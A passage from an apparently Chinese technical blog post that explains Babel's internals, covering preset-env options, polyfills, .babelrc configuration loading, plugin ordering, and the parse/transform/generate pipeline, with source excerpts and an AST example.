的各个组件来进行代码编译，是整个行为的组织者和调度者。</p><p>transform 方法会调用 transformFileRunner 进行文件编译，首先就是 loadConfig 方法生成完整的配置。然后读取文件中的代码，根据这个配置进行编译。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> transformFileRunner <span class="token operator">=</span> gensync<span class="token operator">&lt;</span><span class="token punctuation">[</span>string<span class="token punctuation">,</span> <span class="token operator">?</span>InputOptions<span class="token punctuation">]</span><span class="token punctuation">,</span> FileResult <span class="token operator">|</span> <span class="token keyword">null</span><span class="token operator">></span><span class="token punctuation">(</span>  <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> opts<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>opts<span class="token punctuation">,</span> filename <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> config<span class="token punctuation">:</span> ResolvedConfig <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token function">loadConfig</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>config <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token keyword">yield</span><span class="token operator">*</span> fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token function">run</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、-babel-preset-env："><a href="#3、-babel-preset-env：" class="headerlink" title="3、@babel/preset-env："></a><strong>3、@babel/preset-env：</strong></h4><p>这是一个预设的插件集合，包含了一组相关的插件，Bable中是通过各种插件来指导如何进行代码转换。该插件包含所有es6转化为es5的翻译规则</p><p>babel官网对此进行的如下说明：</p><blockquote><p>Transformations come in the form of plugins, which are small JavaScript programs that instruct Babel on how to carry out transformations to the code. You can even write your own plugins to apply any transformations you want to your code. To transform ES2015+ syntax into ES5 we can rely on official plugins like<code>@babel/plugin-transform-arrow-functions</code></p></blockquote><p>大致即es6到es5的语法转换是以插件的形式实现的，可以是自己的插件也可以是官方提供的插件如箭头函数转换插件@babel/plugin-transform-arrow-functions。</p><p>由此我们可以看出，我们需要转换哪些新的语法，都可以将相关的插件一一列出，但是这其实非常复杂，因为我们往往需要根据兼容的浏览器的不同版本来确定需要引入哪些插件，为了解决这个问题，babel给我们提供了一个预设插件组，即@babel/preset-env，可以根据选项参数来灵活地决定提供哪些插件</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"presets"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"es2015"</span><span class="token punctuation">,</span><span class="token string">"react"</span><span class="token punctuation">,</span><span class="token string">"stage-1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"plugins"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"transform-runtime"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        <span class="token property">"libraryName"</span><span class="token operator">:</span> <span class="token string">"cheui-react"</span><span class="token punctuation">,</span>        <span class="token property">"libraryDirectory"</span><span class="token operator">:</span> <span class="token string">"lib/components"</span><span class="token punctuation">,</span>        <span class="token property">"camel2DashComponentName"</span><span class="token operator">:</span> <span class="token boolean">true</span> // default<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三个关键参数：    </p><p>1、<strong><a href="https://babeljs.io/docs/en/babel-preset-env.html#targets" target="_blank" rel="noopener">targets</a></strong>:</p><blockquote><p>Describes the environments you support/target for your project.</p></blockquote><p>简单讲，该参数决定了我们项目需要适配到的环境，比如可以申明适配到的浏览器版本，这样 babel 会根据浏览器的支持情况自动引入所需要的 polyfill。</p><p>2、<strong><a href="https://babeljs.io/docs/en/babel-preset-env.html#usebuiltins" target="_blank" rel="noopener">useBuiltIns</a></strong>:</p><p>“usage” | “entry” | false, defaults to false</p><blockquote><p>This option configures how @babel/preset-env handles polyfills.</p></blockquote><p>这个参数决定了 preset-env 如何处理 polyfills。</p><pre><code>false`: 这种方式下，不会引入 polyfills，你需要人为在入口文件处`import &#39;@babel/polyfill&#39;;</code></pre><p>但如上这种方式在 <code>@babel@7.4</code> 之后被废弃了，取而代之的是在入口文件处自行 import 如下代码</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token string">'core-js/stable'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'regenerator-runtime/runtime'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// your code</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>不推荐采用 <code>false</code>，这样会把所有的 polyfills 全部打入，造成包体积庞大</strong></p><p><code>usage</code>:</p><p>我们在项目的入口文件处不需要 import 对应的 polyfills 相关库。 babel 会根据用户代码的使用情况，并根据 targets 自行注入相关 polyfills。</p><p><code>entry</code>:</p><p>我们在项目的入口文件处 import 对应的 polyfills 相关库，例如</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token string">'core-js/stable'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'regenerator-runtime/runtime'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// your code</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时 babel 会根据当前 targets 描述，把需要的所有的 polyfills 全部引入到你的入口文件（注意是全部，不管你是否有用到高级的 API）</p><p>3、<strong><a href="https://babeljs.io/docs/en/babel-preset-env.html#corejs" target="_blank" rel="noopener">corejs</a></strong>:</p><blockquote><p>String or { version: string, proposals: boolean }, defaults to “2.0”.</p></blockquote><p><a href="https://github.com/zloirock/core-js" target="_blank" rel="noopener">corejs</a></p><p>注意 corejs 并不是特殊概念，而是浏览器的 polyfill 都由它来管了。</p><p>举个例子</p><pre><code>javascript const one = Symbol(&#39;one&#39;);</code></pre><p>==Babel==&gt;</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"core-js/modules/es.symbol.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"core-js/modules/es.symbol.description.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"core-js/modules/es.object.to-string.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> one <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里或许有人可能不太清楚，2 和 3 有啥区别，可以看看官方的文档 <a href="https://github.com/zloirock/core-js/blob/master/docs/2019-03-19-core-js-3-babel-and-a-look-into-the-future.md" target="_blank" rel="noopener">core-js@3, babel and a look into the future</a></p><p>简单讲 corejs-2 不会维护了，所有浏览器新 feature 的 polyfill 都会维护在 corejs-3 上。</p><p><strong>总结下：用 corejs-3，开启 <code>proposals: true</code>，proposals 为真那样我们就可以使用 proposals 阶段的 API 了。</strong></p><h4 id="4、-babel-polyfill："><a href="#4、-babel-polyfill：" class="headerlink" title="4、@babel/polyfill："></a><strong>4、@babel/polyfill：</strong></h4><p>@babel/preset-env只是提供了语法转换的规则，但是它并不能弥补浏览器缺失的一些新的功能，如一些内置的方法和对象，如Promise,Array.from等，此时就需要polyfill来做js得垫片，弥补低版本浏览器缺失的这些新功能。</p><p>我们需要注意的是，polyfill的体积是很大的，如果我们不做特殊说明，它会把你目标浏览器中缺失的所有的es6的新的功能都做垫片处理。但是我们没有用到的那部分功能的转换其实是无意义的，造成打包后的体积无谓的增大，所以通常，我们会在presets的选项里，配置<strong>“useBuiltIns”: “usage”,这样一方面只对使用的新功能做垫片，另一方面，也不需要我们单独引入import ‘</strong>@babel/polyfill<strong>‘了，它会在使用的地方自动注入。</strong></p><h4 id="5、babel-loader"><a href="#5、babel-loader" class="headerlink" title="5、babel-loader:"></a><strong>5、babel-loader:</strong></h4><p>以上@babel/core、@babel/preset-env 、@babel/polyfill其实都是在做es6的语法转换和弥补缺失的功能，但是当我们在使用webpack打包js时，webpack并不知道应该怎么去调用这些规则去编译js。这时就需要babel-loader了，它作为一个中间桥梁，通过调用babel/core中的api来告诉webpack要如何处理js。</p><h4 id="6、-babel-plugin-transform-runtime："><a href="#6、-babel-plugin-transform-runtime：" class="headerlink" title="6、@babel/plugin-transform-runtime："></a><strong>6、@babel/plugin-transform-runtime：</strong></h4><p>polyfill的垫片是在全局变量上挂载目标浏览器缺失的功能，因此在开发类库，第三方模块或者组件库时，就不能再使用babel-polyfill了，否则可能会造成全局污染，此时应该使用transform-runtime。transform-runtime的转换是非侵入性的，也就是它不会污染你的原有的方法。遇到需要转换的方法它会另起一个名字，否则会直接影响使用库的业务代码，</p><h3 id="babelrc"><a href="#babelrc" class="headerlink" title=".babelrc"></a>.babelrc</h3><p>如果我们什么都不配置的话，打包后的文件不会有任何变化，需要在 babelrc 文件中对 babel 做如下配置。然后打包。我们后续会分析该配置作用的机制。</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"presets"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"@babel/preset-env"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>@babel/cli 解析命令行，但是仅有命令行中的参数的话，babel 是无法进行编译工作的，还缺少一些关键性的参数，也就是配置在 .babelrc 文件中的插件信息。</p><p>@babel/core 在执行 transformFile 操作之前，第一步就是读取 .babelrc 文件中的配置。</p><p>流程是这样的，babel 首先会判断命令行中有没有指定配置文件（-config-file），有就解析，没有的话 babel 会在当前根目录下寻找默认的配置文件。默认文件名称定义如下。优先级从上到下。</p><p>babel-main\packages\babel-core\src\config\files\configuration.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> RELATIVE_CONFIG_FILENAMES <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token string">".babelrc"</span><span class="token punctuation">,</span>  <span class="token string">".babelrc.js"</span><span class="token punctuation">,</span>  <span class="token string">".babelrc.cjs"</span><span class="token punctuation">,</span>  <span class="token string">".babelrc.mjs"</span><span class="token punctuation">,</span>  <span class="token string">".babelrc.json"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>.babelrc 文件中，我们经常配置的是 plugins 和 presets，plugin 是 babel 中真正干活的，代码的转化全靠它，但是随着 plugin 的增多，如何管理好这些 plugin 也是一个挑战。于是，babel 将一些 plugin 放在一起，称之为 preset。</p><p>对于 babelrc 中的 plugins 和 presets，babel 将每一项都转化为一个 ConfigItem。presets 是一个 ConfigItem 数组，plugins 也是一个 ConfigItem 数组。</p><p>假设有如下的 .babelrc 文件，会生成这样的 json 配置。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>    <span class="token string">"presets"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"@babel/preset-env"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"@babel/plugin-proposal-class-properties"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>     ConfigItem <span class="token punctuation">{</span>      value<span class="token punctuation">:</span> <span class="token punctuation">[</span>Function<span class="token punctuation">]</span><span class="token punctuation">,</span>      options<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>      dirname<span class="token punctuation">:</span> <span class="token string">'babel\\babel-demo'</span><span class="token punctuation">,</span>      name<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>      file<span class="token punctuation">:</span> <span class="token punctuation">{</span>        request<span class="token punctuation">:</span> <span class="token string">'@babel/plugin-proposal-class-properties'</span><span class="token punctuation">,</span>        resolved<span class="token punctuation">:</span> <span class="token string">'babel\\babel-demo\\node_modules\\@babel\\plugin-proposal-class-properties\\lib\\index.js'</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  presets<span class="token punctuation">:</span> <span class="token punctuation">[</span>    ConfigItem <span class="token punctuation">{</span>      value<span class="token punctuation">:</span> <span class="token punctuation">[</span>Function<span class="token punctuation">]</span><span class="token punctuation">,</span>      options<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>      dirname<span class="token punctuation">:</span> <span class="token string">'babel\\babel-demo'</span><span class="token punctuation">,</span>      name<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>      file<span class="token punctuation">:</span> <span class="token punctuation">{</span>        request<span class="token punctuation">:</span> <span class="token string">'@babel/preset-env'</span><span class="token punctuation">,</span>        resolved<span class="token punctuation">:</span> <span class="token string">'babel\\babel-demo\\node_modules\\@babel\\preset-env\\lib\\index.js'</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 plugins，babel 会依序加载其中的内容，解析出插件中定义的 pre，visitor 等对象。由于 presets 中会包含对个 plugin，甚至会包括新的 preset，所以 babel 需要解析 preset 的内容，将其中包含的 plugin 解析出来。以 @babel/preset-env 为例，babel 会将其中的 40 个 plugin 解析到，之后会重新解析 presets 中的插件。</p><p>这里有一个很有意思的点，就是对于解析出的插件列表，处理的方式是使用 unshift 插入到一个列表的头部。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>plugins<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  pass<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token operator">...</span>plugins<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这其实是因为 presets 加载顺序和一般理解不一样 ，比如 presets 写成 [“es2015”, “stage-0”]，由于 stage-x 是 Javascript 语法的一些提案，那这部分可能依赖了ES6 的语法，解析的时候需要先将新的语法解析成 ES6,在把 ES6 解析成 ES5。这也就是使用 unshift 的原因。新的 preset 中的插件会被优先执行。</p><p>当然，不管 presets 的顺序是怎样的，我们定义的 plugins 中的插件永远是最高优先级。原因是 plugins 中的插件是在 presets 处理完毕后使用 unshift 插入对列头部。</p><p>最终生成的配置包含 options 和 passes 两块，大部分情况下，options 中的 presets 是个空数组，plugins 中存放着插件集合，passes 中的内容和 options.plugins 是一致的。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  options<span class="token punctuation">:</span> <span class="token punctuation">{</span>    babelrc<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    caller<span class="token punctuation">:</span> <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"@babel/cli"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    cloneInputAst<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    configFile<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    envName<span class="token punctuation">:</span> <span class="token string">"development"</span><span class="token punctuation">,</span>    filename<span class="token punctuation">:</span> <span class="token string">"babel-demo\src\index.js"</span><span class="token punctuation">,</span>    plugins<span class="token punctuation">:</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    presets<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span>  passes<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="babel执行编译"><a href="#babel执行编译" class="headerlink" title="babel执行编译"></a>babel执行编译</h2><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpvzw5o4z6j31d20l013v.jpg" alt="image-20210425145517250"></p><p>下面看一下run的主要代码</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">run</span><span class="token punctuation">(</span>  config<span class="token punctuation">:</span> ResolvedConfig<span class="token punctuation">,</span>  code<span class="token punctuation">:</span> string<span class="token punctuation">,</span>  ast<span class="token punctuation">:</span> <span class="token operator">?</span><span class="token punctuation">(</span>BabelNodeFile <span class="token operator">|</span> BabelNodeProgram<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Handler<span class="token operator">&lt;</span>FileResult<span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> file <span class="token operator">=</span> <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token function">normalizeFile</span><span class="token punctuation">(</span>    config<span class="token punctuation">.</span>passes<span class="token punctuation">,</span>    <span class="token function">normalizeOptions</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">,</span>    code<span class="token punctuation">,</span>    ast<span class="token punctuation">,</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> opts <span class="token operator">=</span> file<span class="token punctuation">.</span>opts<span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token function">transformFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> config<span class="token punctuation">.</span>passes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> outputCode<span class="token punctuation">,</span> outputMap<span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>code <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">(</span><span class="token punctuation">{</span> outputCode<span class="token punctuation">,</span> outputMap <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">generateCode</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>passes<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    metadata<span class="token punctuation">:</span> file<span class="token punctuation">.</span>metadata<span class="token punctuation">,</span>    options<span class="token punctuation">:</span> opts<span class="token punctuation">,</span>    ast<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>ast <span class="token operator">===</span> <span class="token boolean">true</span> <span class="token operator">?</span> file<span class="token punctuation">.</span>ast <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    code<span class="token punctuation">:</span> outputCode <span class="token operator">===</span> undefined <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token punctuation">:</span> outputCode<span class="token punctuation">,</span>    map<span class="token punctuation">:</span> outputMap <span class="token operator">===</span> undefined <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token punctuation">:</span> outputMap<span class="token punctuation">,</span>    sourceType<span class="token punctuation">:</span> file<span class="token punctuation">.</span>ast<span class="token punctuation">.</span>program<span class="token punctuation">.</span>sourceType<span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>首先是执行 normalizeFile 方法，该方法的作用就是将 code 转化为抽象语法树（AST）；</li><li>接着执行 transformFile 方法，该方法入参有我们的插件列表，这一步做的就是根据插件修改 AST 的内容；</li><li>最后执行 generateCode 方法，将修改后的 AST 转换成代码。</li></ol><p>整个编译过程还是挺清晰的，简单来说就是解析（parse），转换（transform），生成（generate）。我们详细看下每个过程。</p><h3 id="解析（parse）"><a href="#解析（parse）" class="headerlink" title="解析（parse）"></a>解析（parse）</h3><p>了解解析过程之前，要先了解抽象语法树（AST），它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。不同的语言生成 AST 规则不同，在 JS 中，AST 就是一个用于描述代码的 JSON 串。</p><p>举例简单的例子，对于一个简单的常量申明，生成的 AST 代码是这样的。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">{</span>  <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string">"start"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string">"end"</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token string">"body"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"VariableDeclaration"</span><span class="token punctuation">,</span>      <span class="token string">"start"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string">"end"</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">,</span>      <span class="token string">"declarations"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"VariableDeclarator"</span><span class="token punctuation">,</span>          <span class="token string">"start"</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>          <span class="token string">"end"</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">,</span>          <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token string">"start"</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token string">"end"</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"a"</span>          <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token string">"init"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>            <span class="token string">"start"</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token string">"end"</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">,</span>            <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token string">"raw"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">"kind"</span><span class="token punctuation">:</span> <span class="token string">"const"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"sourceType"</span><span class="token punctuation">:</span> <span class="token string">"module"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到 normalizeFile 方法，该方法中调用了 parser 方法。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">normalizeFile</span><span class="token punctuation">(</span>  pluginPasses<span class="token punctuation">:</span> PluginPasses<span class="token punctuation">,</span>  options<span class="token punctuation">:</span> Object<span class="token punctuation">,</span>  code<span class="token punctuation">:</span> string<span class="token punctuation">,</span>  ast<span class="token punctuation">:</span> <span class="token operator">?</span><span class="token punctuation">(</span>BabelNodeFile <span class="token operator">|</span> BabelNodeProgram<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Handler<span class="token operator">&lt;</span>File<span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token operator">...</span>  ast <span class="token operator">=</span> <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token function">parser</span><span class="token punctuation">(</span>pluginPasses<span class="token punctuation">,</span> options<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>parser 会遍历所有的插件，看哪个插件中定义了 parserOverride 方法。为了方便理解，我们先跳过这部分，先看 parse 方法，parse 方法是 @babel/parser 提供的一个方法，用于将 JS 代码装化为 AST。</p><p>正常情况下， @babel/parser 中的规则是可以很好的完成 AST 转换的，但如果我们需要自定义语法，或者是修改/扩展这些规则的时候，@babel/parser 就不够用了。babel 想了个方法，就是你可以自己写一个 parser，然后通过插件的方式，指定这个 parser 作为 babel 的编译器。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> parse <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@babel/parser"</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">parser</span><span class="token punctuation">(</span>  pluginPasses<span class="token punctuation">:</span> PluginPasses<span class="token punctuation">,</span>  <span class="token punctuation">{</span> parserOpts<span class="token punctuation">,</span> highlightCode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span> filename <span class="token operator">=</span> <span class="token string">"unknown"</span> <span class="token punctuation">}</span><span class="token punctuation">:</span> Object<span class="token punctuation">,</span>  code<span class="token punctuation">:</span> string<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Handler<span class="token operator">&lt;</span>ParseResult<span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> plugins <span class="token keyword">of</span> pluginPasses<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> plugin <span class="token keyword">of</span> plugins<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> parserOverride <span class="token punctuation">}</span> <span class="token operator">=</span> plugin<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parserOverride<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">const</span> ast <span class="token operator">=</span> <span class="token function">parserOverride</span><span class="token 